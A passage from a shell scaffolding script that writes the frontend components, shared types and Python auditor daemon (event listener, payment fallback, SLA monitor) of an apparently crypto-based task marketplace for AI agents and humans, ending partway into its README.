  darkMode: ["class"],
  content: ['./pages/**/*.{ts,tsx}', './components/**/*.{ts,tsx}', './app/**/*.{ts,tsx}'],
  theme: {
    container: { center: true, padding: "2rem", screens: { "2xl": "1400px" } },
    extend: {
      colors: {
        border: "hsl(var(--border))",
        input: "hsl(var(--input))",
        ring: "hsl(var(--ring))",
        background: "hsl(var(--background))",
        foreground: "hsl(var(--foreground))",
        primary: { DEFAULT: "hsl(var(--primary))", foreground: "hsl(var(--primary-foreground))" },
        secondary: { DEFAULT: "hsl(var(--secondary))", foreground: "hsl(var(--secondary-foreground))" },
      },
      borderRadius: { lg: "var(--radius)", md: "calc(var(--radius) - 2px)", sm: "calc(var(--radius) - 4px)" },
    },
  },
  plugins: [],
};
export default config;
EOF

cat > packages/frontend/app/layout.tsx << 'EOF'
import type { Metadata } from 'next';
import { Inter } from 'next/font/google';
import './globals.css';

const inter = Inter({ subsets: ['latin'] });

export const metadata: Metadata = {
  title: 'A2A Marketplace',
  description: 'Decentralized Task Marketplace for AI Agents and Humans',
};

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="en" suppressHydrationWarning>
      <body className={inter.className}>{children}</body>
    </html>
  );
}
EOF

cat > packages/frontend/app/page.tsx << 'EOF'
import Link from 'next/link';
import { Button } from '@/components/ui/button';

export default function Home() {
  return (
    <main className="min-h-screen bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-950">
      <div className="container mx-auto px-4 py-16">
        <div className="text-center mb-12">
          <h1 className="text-5xl font-bold mb-4">Decentralized Task Marketplace</h1>
          <p className="text-xl text-gray-600 dark:text-gray-300 mb-8">
            Connect AI Agents and Human Workers for automated task execution
          </p>
          <div className="flex gap-4 justify-center">
            <Button asChild size="lg"><Link href="/marketplace">Explore Tasks</Link></Button>
            <Button asChild size="lg" variant="outline"><Link href="/agents">Browse Agents</Link></Button>
          </div>
        </div>
      </div>
    </main>
  );
}
EOF

cat > packages/frontend/app/globals.css << 'EOF'
@tailwind base;
@tailwind components;
@tailwind utilities;
@layer base {
  :root {
    --background: 0 0% 100%;
    --foreground: 222.2 84% 4.9%;
    --primary: 222.2 47.4% 11.2%;
    --primary-foreground: 210 40% 98%;
    --secondary: 210 40% 96.1%;
    --secondary-foreground: 222.2 47.4% 11.2%;
    --border: 214.3 31.8% 91.4%;
    --input: 214.3 31.8% 91.4%;
    --ring: 222.2 84% 4.9%;
    --radius: 0.5rem;
  }
  .dark {
    --background: 222.2 84% 4.9%;
    --foreground: 210 40% 98%;
    --primary: 210 40% 98%;
    --primary-foreground: 222.2 47.4% 11.2%;
    --secondary: 217.2 32.6% 17.5%;
    --secondary-foreground: 210 40% 98%;
    --border: 217.2 32.6% 17.5%;
    --input: 217.2 32.6% 17.5%;
    --ring: 212.7 26.8% 83.9%;
  }
}
@layer base {
  * { @apply border-border; }
  body { @apply bg-background text-foreground; }
}
EOF

cat > packages/frontend/components/ui/button.tsx << 'EOF'
import * as React from 'react';
import { Slot } from '@radix-ui/react-slot';
import { cva, type VariantProps } from 'class-variance-authority';
import { cn } from '@/lib/utils';

const buttonVariants = cva(
  'inline-flex items-center justify-center rounded-md text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50',
  {
    variants: {
      variant: {
        default: 'bg-primary text-primary-foreground hover:bg-primary/90',
        outline: 'border border-input bg-background hover:bg-accent',
        ghost: 'hover:bg-accent hover:text-accent-foreground',
      },
      size: {
        default: 'h-10 px-4 py-2',
        sm: 'h-9 rounded-md px-3',
        lg: 'h-11 rounded-md px-8',
      },
    },
    defaultVariants: { variant: 'default', size: 'default' },
  }
);

export interface ButtonProps
  extends React.ButtonHTMLAttributes<HTMLButtonElement>,
    VariantProps<typeof buttonVariants> {
  asChild?: boolean;
}

const Button = React.forwardRef<HTMLButtonElement, ButtonProps>(
  ({ className, variant, size, asChild = false, ...props }, ref) => {
    const Comp = asChild ? Slot : 'button';
    return <Comp className={cn(buttonVariants({ variant, size, className }))} ref={ref} {...props} />;
  }
);
Button.displayName = 'Button';

export { Button, buttonVariants };
EOF

cat > packages/frontend/components/ui/card.tsx << 'EOF'
import * as React from 'react';
import { cn } from '@/lib/utils';

const Card = React.forwardRef<HTMLDivElement, React.HTMLAttributes<HTMLDivElement>>(
  ({ className, ...props }, ref) => (
    <div ref={ref} className={cn('rounded-lg border bg-card text-card-foreground shadow-sm', className)} {...props} />
  )
);
Card.displayName = 'Card';

const CardHeader = React.forwardRef<HTMLDivElement, React.HTMLAttributes<HTMLDivElement>>(
  ({ className, ...props }, ref) => (
    <div ref={ref} className={cn('flex flex-col space-y-1.5 p-6', className)} {...props} />
  )
);
CardHeader.displayName = 'CardHeader';

const CardTitle = React.forwardRef<HTMLParagraphElement, React.HTMLAttributes<HTMLHeadingElement>>(
  ({ className, ...props }, ref) => (
    <h3 ref={ref} className={cn('text-2xl font-semibold leading-none tracking-tight', className)} {...props} />
  )
);
CardTitle.displayName = 'CardTitle';

const CardContent = React.forwardRef<HTMLDivElement, React.HTMLAttributes<HTMLDivElement>>(
  ({ className, ...props }, ref) => (
    <div ref={ref} className={cn('p-6 pt-0', className)} {...props} />
  )
);
CardContent.displayName = 'CardContent';

export { Card, CardHeader, CardTitle, CardContent };
EOF

cat > packages/frontend/components/ui/input.tsx << 'EOF'
import * as React from 'react';
import { cn } from '@/lib/utils';

export interface InputProps extends React.InputHTMLAttributes<HTMLInputElement> {}

const Input = React.forwardRef<HTMLInputElement, InputProps>(
  ({ className, type, ...props }, ref) => {
    return (
      <input
        type={type}
        className={cn(
          'flex h-10 w-full rounded-md border border-input bg-background px-3 py-2 text-sm ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50',
          className
        )}
        ref={ref}
        {...props}
      />
    );
  }
);
Input.displayName = 'Input';

export { Input };
EOF

cat > packages/frontend/lib/utils.ts << 'EOF'
import { type ClassValue, clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';

export function cn(...inputs: ClassValue[]) {
  return twMerge(clsx(inputs));
}

export function formatAddress(address: string) {
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

export function formatUSDC(amount: number) {
  return new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: 'USD',
  }).format(amount);
}
EOF

cat > packages/frontend/hooks/useWeb3.ts << 'EOF'
'use client';
import { createConfig, WagmiProvider } from 'wagmi';
import { base } from 'wagmi/chains';
import { injected, walletConnect } from 'wagmi/connectors';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';

const config = createConfig({
  chains: [base],
  connectors: [
    injected(),
    walletConnect({ projectId: process.env.NEXT_PUBLIC_WALLETCONNECT_ID || '' }),
  ],
});

const queryClient = new QueryClient();

export function Web3Provider({ children }: { children: React.ReactNode }) {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        {children}
      </QueryClientProvider>
    </WagmiProvider>
  );
}
EOF

cat > packages/frontend/types/index.ts << 'EOF'
export interface Task {
  id: string;
  title: string;
  description: string;
  budget: number;
  status: 'OPEN' | 'IN_PROGRESS' | 'COMPLETED' | 'DISPUTED';
  allocationType: 'AUTO_AGENT' | 'HUMAN_ONLY' | 'HYBRID';
  verificationType: 'AUTOMATIC' | 'MANUAL';
  clientId: string;
  workerId?: string;
  createdAt: Date;
  deadline?: Date;
}

export interface Agent {
  id: string;
  userId: string;
  capabilities: string[];
  isActive: boolean;
  reputation: number;
  jobsCompleted: number;
}

export interface User {
  id: string;
  email: string;
  walletAddress?: string;
  role: 'CLIENT' | 'WORKER' | 'ADMIN';
  reputation: number;
}
EOF

# ============================================
# AUDITOR DAEMON (PYTHON)
# ============================================
cat > packages/auditor-daemon/requirements.txt << 'EOF'
web3==6.15.1
asyncio==3.4.3
loguru==0.7.2
redis==5.0.1
python-dotenv==1.0.1
requests==2.31.0
websockets==12.0
pydantic==2.6.3
eth-account==0.11.0
eth-typing==4.2.0
EOF

cat > packages/auditor-daemon/pyproject.toml << 'EOF'
[project]
name = "a2a-auditor"
version = "1.0.0"
description = "A2A Marketplace Auditor Daemon"
requires-python = ">=3.11"
dependencies = [
    "web3>=6.15.1",
    "loguru>=0.7.2",
    "redis>=5.0.1",
    "python-dotenv>=1.0.1",
]
[tool.pytest.ini_options]
testpaths = ["tests"]
EOF

cat > packages/auditor-daemon/src/main.py << 'EOF'
import asyncio
from loguru import logger
from services.event_listener import EventListener
from services.task_recovery import TaskRecoveryService
from services.sla_monitor import SLAMonitor

async def main():
    logger.info("Starting A2A Auditor Daemon...")
    event_listener = EventListener()
    task_recovery = TaskRecoveryService()
    sla_monitor = SLAMonitor()
    tasks = [event_listener.start(), task_recovery.start(), sla_monitor.start()]
    try:
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        logger.info("Shutting down...")

if __name__ == "__main__":
    asyncio.run(main())
EOF

cat > packages/auditor-daemon/src/config/settings.py << 'EOF'
import os
from dotenv import load_dotenv
load_dotenv()

class Settings:
    RPC_URL = os.getenv('RPC_URL', 'https://mainnet.base.org')
    ESCROW_ADDRESS = os.getenv('ESCROW_ADDRESS', '')
    AUDITOR_PRIVATE_KEY = os.getenv('AUDITOR_PRIVATE_KEY', '')
    REDIS_URL = os.getenv('REDIS_URL', 'redis://localhost:6379')
    SLA_TIMEOUT_MINUTES = 30
    MAX_RETRIES = 3
    ALERT_WEBHOOK_URL = os.getenv('ALERT_WEBHOOK_URL', '')

settings = Settings()
EOF

cat > packages/auditor-daemon/src/services/event_listener.py << 'EOF'
import asyncio
from loguru import logger
from web3 import Web3
from config.settings import settings

class EventListener:
    def __init__(self):
        self.web3 = Web3(Web3.HTTPProvider(settings.RPC_URL))
        self.escrow_contract = self.web3.eth.contract(
            address=settings.ESCROW_ADDRESS,
            abi=ESCROW_ABI
        )
    
    async def start(self):
        logger.info("Starting event listener...")
        while True:
            try:
                events = self.escrow_contract.events.PaymentReleased.get_logs(fromBlock='latest')
                for event in events:
                    await self.handle_event(event)
                await asyncio.sleep(5)
            except Exception as e:
                logger.error(f"Error in event listener: {e}")
                await asyncio.sleep(10)
    
    async def handle_event(self, event):
        task_id = event['args']['taskId']
        worker = event['args']['worker']
        amount = event['args']['workerAmount']
        logger.info(f"Payment released for task {task_id} to {worker}: {amount} USDC")
    
    async def update_task_status(self, task_id, status):
        pass

ESCROW_ABI = [
    {
        "anonymous": False,
        "inputs": [
            {"indexed": True, "name": "taskId", "type": "bytes32"},
            {"indexed": True, "name": "worker", "type": "address"},
            {"indexed": False, "name": "workerAmount", "type": "uint256"},
            {"indexed": False, "name": "fee", "type": "uint256"}
        ],
        "name": "PaymentReleased",
        "type": "event"
    }
]
EOF

cat > packages/auditor-daemon/src/services/task_recovery.py << 'EOF'
from loguru import logger
import asyncio
from config.settings import settings

class TaskRecoveryService:
    def __init__(self):
        self.retry_count = {}
        self.max_retries = settings.MAX_RETRIES
    
    async def start(self):
        logger.info("Starting task recovery service...")
        while True:
            try:
                failed_tasks = await self.get_failed_tasks()
                for task in failed_tasks:
                    await self.recover_task(task)
                await asyncio.sleep(30)
            except Exception as e:
                logger.error(f"Error in recovery service: {e}")
                await asyncio.sleep(60)
    
    async def get_failed_tasks(self):
        return []
    
    async def recover_task(self, task_id):
        logger.info(f"Recovering task {task_id}")
        if self.retry_count.get(task_id, 0) >= self.max_retries:
            logger.error(f"Task {task_id} exceeded max retries")
            await self.execute_fallback(task_id)
            return
        self.retry_count[task_id] = self.retry_count.get(task_id, 0) + 1
        await self.reassign_task(task_id)
    
    async def reassign_task(self, task_id):
        pass
    
    async def execute_fallback(self, task_id):
        pass
EOF

cat > packages/auditor-daemon/src/services/payment_service.py << 'EOF'
from loguru import logger
from web3 import Web3
from config.settings import settings

class PaymentService:
    def __init__(self):
        self.web3 = Web3(Web3.HTTPProvider(settings.RPC_URL))
        self.escrow_contract = self.web3.eth.contract(
            address=settings.ESCROW_ADDRESS,
            abi=ESCROW_ABI
        )
    
    async def execute_fallback_payout(self, task_id):
        try:
            tx = self.escrow_contract.functions.executeFallbackPayout(task_id).build_transaction({
                'from': settings.AUDITOR_WALLET,
                'nonce': self.web3.eth.get_transaction_count(settings.AUDITOR_WALLET),
                'gas': 200000,
                'gasPrice': self.web3.eth.gas_price
            })
            signed_tx = self.web3.eth.account.sign_transaction(tx, private_key=settings.AUDITOR_PRIVATE_KEY)
            tx_hash = self.web3.eth.send_raw_transaction(signed_tx.rawTransaction)
            logger.info(f"Fallback payout executed: {tx_hash.hex()}")
            return tx_hash.hex()
        except Exception as e:
            logger.error(f"Error executing fallback payout: {e}")
            return None

ESCROW_ABI = [
    {
        "inputs": [{"name": "taskId", "type": "bytes32"}],
        "name": "executeFallbackPayout",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
]
EOF

cat > packages/auditor-daemon/src/services/sla_monitor.py << 'EOF'
from loguru import logger
import asyncio
from config.settings import settings

class SLAMonitor:
    def __init__(self):
        self.sla_timeout = settings.SLA_TIMEOUT_MINUTES
    
    async def start(self):
        logger.info("Starting SLA monitor...")
        while True:
            try:
                overdue_tasks = await self.get_overdue_tasks()
                for task in overdue_tasks:
                    await self.send_alert(task)
                await asyncio.sleep(60)
            except Exception as e:
                logger.error(f"Error in SLA monitor: {e}")
                await asyncio.sleep(120)
    
    async def get_overdue_tasks(self):
        return []
    
    async def send_alert(self, task):
        logger.warning(f"Task {task['id']} approaching SLA timeout")
EOF

# ============================================
# SHARED UTILITIES
# ============================================
cat > packages/shared/types/index.ts << 'EOF'
export interface Task {
  id: string;
  title: string;
  description: string;
  budget: number;
  status: 'OPEN' | 'IN_PROGRESS' | 'COMPLETED' | 'DISPUTED';
  allocationType: 'AUTO_AGENT' | 'HUMAN_ONLY' | 'HYBRID';
  verificationType: 'AUTOMATIC' | 'MANUAL';
  clientId: string;
  workerId?: string;
  createdAt: Date;
  deadline?: Date;
}

export interface Agent {
  id: string;
  userId: string;
  capabilities: string[];
  isActive: boolean;
  reputation: number;
  jobsCompleted: number;
}

export interface User {
  id: string;
  email: string;
  walletAddress?: string;
  role: 'CLIENT' | 'WORKER' | 'ADMIN';
  reputation: number;
}
EOF

cat > packages/shared/utils/format.ts << 'EOF'
export function formatAddress(address: string): string {
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

export function formatUSDC(amount: number): string {
  return new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: 'USD',
    minimumFractionDigits: 2,
  }).format(amount);
}

export function formatDate(date: Date): string {
  return new Intl.DateTimeFormat('en-US', {
    year: 'numeric',
    month: 'short',
    day: 'numeric',
  }).format(date);
}
EOF

# ============================================
# DOCUMENTACIÓN Y DOCKER
# ============================================
cat > README.md << 'EOF'
# 🤖 A2A Task & Human Marketplace

## 📋 Descripción
Plataforma descentralizada de marketplace de tareas donde agentes autónomos (IA) y trabajadores humanos pueden ejecutar tareas, recibir pagos en USDC y construir reputación on-chain.

## 🛠️ Stack Tecnológico
- **Frontend:** Next.js 14, React, TypeScript, TailwindCSS
- **Backend:** Node.js (Fastify), PostgreSQL, Redis
- **Smart Contracts:** Solidity (Base L2), Foundry
- **Auditor Daemon:** Python 3.11+, Web3.py

## 🚀 Instalación
```bash
git clone https://github.com/minacryptoo/Agent-Agent.git
pnpm install
cd packages/contracts
forge build
forge test
cd ../api-gateway
pnpm dev
cd ../frontend
pnpm dev
